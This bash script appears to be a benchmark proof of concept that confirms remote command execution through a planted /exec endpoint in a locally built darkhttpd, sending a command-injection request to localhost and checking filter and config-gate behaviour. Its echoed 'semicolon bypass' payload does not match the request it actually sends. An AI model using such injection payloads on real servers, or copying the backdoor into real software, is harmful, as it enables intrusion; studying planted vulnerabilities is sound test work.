#!/usr/bin/env bash
# PoC for 118_darkhttpd_C2I2S2
# Axes: C2 (config file gate) / I2 (snprintf buffered) / S2 (pipe blocked, bypass: semicolon)
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/darkhttpd"
WWWROOT="/tmp/poc_118_www"
MARKER="/tmp/poc_118_marker"
CONF="/tmp/poc_118.conf"
PORT=18118

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create config file that enables the exec gate
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
EOF

# Start server WITH config file
echo "[*] starting darkhttpd with --config on port $PORT..."
"$BINARY" "$WWWROOT" --port "$PORT" --config "$CONF" --log /dev/null &
SERVER_PID=$!
sleep 0.4

# Trigger exploit — use semicolon to bypass pipe filter (S2 bypass)
echo "[*] sending payload (semicolon bypass): cmd=id;true>/dev/null and id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Verify S2 blocks pipe
echo "[*] verifying S2: pipe should be blocked..."
PIPE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:${PORT}/exec?cmd=id|cat" || echo "000")
if [[ "$PIPE_CODE" == "403" ]]; then
    echo "[+] S2 check passed: pipe blocked with 403"
else
    echo "[!] S2 check: got $PIPE_CODE"
fi

# Negative control: start WITHOUT config file
echo "[*] verifying gate: endpoint must be absent without --config..."
NEG_PID=0
"$BINARY" "$WWWROOT" --port $((PORT+1000)) --log /dev/null &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$((PORT+1000))/exec?cmd=id" || echo "000")
kill "$NEG_PID"; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --config"
else
    echo "[!] gate check: got $HTTP_CODE"
fi
